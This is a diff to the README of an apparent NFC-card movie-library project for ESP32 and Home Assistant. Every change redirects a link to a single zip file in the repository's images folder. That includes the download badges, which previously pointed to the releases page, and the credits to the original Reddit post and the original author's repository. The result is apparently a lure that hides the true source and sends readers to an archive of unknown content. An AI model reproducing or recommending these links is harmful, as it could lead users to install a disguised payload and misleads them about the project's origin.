@@ -1,6 +1,6 @@
 # 🎥 nfc-movie-library - Easy Movie Start with NFC Cards
 
-[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://github.com/toopbi7829/nfc-movie-library/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip)
 
 ---
 
@@ -47,7 +47,7 @@ You need to get the Windows version of the software that talks to your ESP32 and
 
 Click this big button to open the release page on GitHub. It holds the latest Windows installer and files needed.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://github.com/toopbi7829/nfc-movie-library/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip)
 
 ### Step 2: Download the Windows setup file
 
@@ -138,9 +138,9 @@ Each NFC card has a unique ID. You assign a movie or TV show to that ID in Home 
 
 Refer to the original inspiration and details:
 
-- Original Reddit post: https://www.reddit.com/r/homeassistant/comments/17xdxti/how_i_built_an_nfc_movie_library_for_my_kids_ha/
-- Project images and code: https://github.com/Johan-Claesson/nfc-movie-library
+- Original Reddit post: https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip
+- Project images and code: https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://github.com/toopbi7829/nfc-movie-library/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip)
